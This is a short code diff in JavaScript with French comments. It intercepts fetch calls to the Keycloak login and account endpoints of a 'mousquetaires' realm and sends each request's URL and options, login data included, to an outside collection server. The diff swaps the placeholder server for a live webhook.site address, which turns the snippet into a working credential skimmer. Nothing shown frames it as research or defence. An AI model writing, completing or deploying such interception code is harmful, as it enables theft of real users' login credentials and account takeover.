@@ -10,7 +10,7 @@
     // Vérifier si l'URL correspond à l'une de celles qui nous intéressent
     if(url.includes('/auth/realms/mousquetaires/account') || url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
       // Par exemple, envoyer ces infos vers votre serveur de collecte
-      originalFetch('https://votre-serveur.com/collect', {
+      originalFetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8/collect', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ url, init })
